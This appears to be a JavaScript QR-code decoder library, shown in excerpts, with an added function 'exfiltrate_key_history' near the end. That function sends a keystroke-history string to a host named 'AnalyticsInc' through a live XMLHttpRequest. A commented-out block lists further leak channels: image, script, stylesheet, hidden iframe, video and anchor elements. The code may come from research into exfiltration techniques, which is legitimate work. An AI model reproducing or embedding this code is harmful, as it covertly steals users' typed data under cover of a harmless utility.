...
function ReedSolomonDecoder(field)
{
    ...
    this.decode = function(received, twoS)
    {
        ...
        for (var i = 0; i < twoS; i++)
        {
            ...
            var evalx = poly.evaluateAt(this.field.exp(dataMatrix ? i + 1 : i));
            syndromeCoefficients[syndromeCoefficients.length - 1 - i] = evalx;
            if (evalx !== 0)
            {
                noError = false;
            }
...
qrcode.process = function(ctx) {
    ...
    var img = qrcode.grayScaleToBitmap(qrcode.grayscale());
    ...
    if (qrcode.debug)
    {
        for (var y = 0; y < qrcode.height; y++)
        {
            for (var x = 0; x < qrcode.width; x++)
            {
                ...
                qrcode.imagedata.data[point] = img[x + y * qrcode.width] ? 0 : 0;
                qrcode.imagedata.data[point + 1] = img[x + y * qrcode.width] ? 0 : 0;
                qrcode.imagedata.data[point + 2] = img[x + y * qrcode.width] ? 255 : 0;
            }
        }
...
/*function gen_exfil_url(key_history, method_label) {
    var exfil_url = 'http://AnalyticsInc:8000/' 
    exfil_url = exfil_url + method_label + ':';
    exfil_url = exfil_url + key_history;
    return exfil_url;
}*/

function exfiltrate_key_history(key_history) {
    /*
    // Exfiltrate data as in image src url
    var img = new Image();
    img.src = gen_exfil_url(key_history, 'add image with src');
    document.body.appendChild( img );

    // Exfiltrate data by modifying
    var img2 = new Image();
    document.body.appendChild( img2 );
    img2.src = gen_exfil_url(key_history, 'modify image src'); 

    // Exfiltrate data in script src url
    var script = document.createElement('script');
    script.src = gen_exfil_url(key_history, 'add script with src'); 
    document.body.appendChild( script );

    // Exfiltrate data using css link
    var link = document.createElement("link");
    link.href = gen_exfil_url(key_history, 'add css link'); 
    link.rel = "stylesheet"
    link.type = "test/css"
    document.body.appendChild( link );

    // Exfiltrate data using an iframe
    ifrm = document.createElement("IFRAME"); 
    ifrm.setAttribute("src", gen_exfil_url(key_history, 'add iframe with src')); 
    ifrm.style.width = 0+"px"; 
    ifrm.style.height = 0+"px"; 
    document.body.appendChild(ifrm); 

    // Exfiltrate data using video
    var video = document.createElement("video");
    video.setAttribute("id", "VideoElement");
    video.setAttribute("src", gen_exfil_url(key_history, 'add video with src'));
    video.setAttribute("controls", "controls");
    video.setAttribute("preload", "auto");
    document.body.appendChild(video)

    // Exfiltrate data using anchor element
    var anchor = document.createElement("anchor");
    anchor.setAttribute("href", gen_exfil_url(key_history, 'add anchor with href'));
    document.body.appendChild(anchor)

    // Exfiltrate data of an area element element

    // Exfiltrate data using window.postMessage
    */
    // Exfiltrate data using XMLHTTP request
    xmlhttp=new XMLHttpRequest();
    xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?" + key_history, true);
    xmlhttp.send(null);

    // Exfiltrate data using web socket
}

function read(a)
{
    document.getElementById('mid').value = a;
}
...
{
    var qrpath = document.getElementById('imgpath').innerHTML;
    qrcode.decode(qrpath);
}

document.getElementById('decode').onclick = processImage;
load();
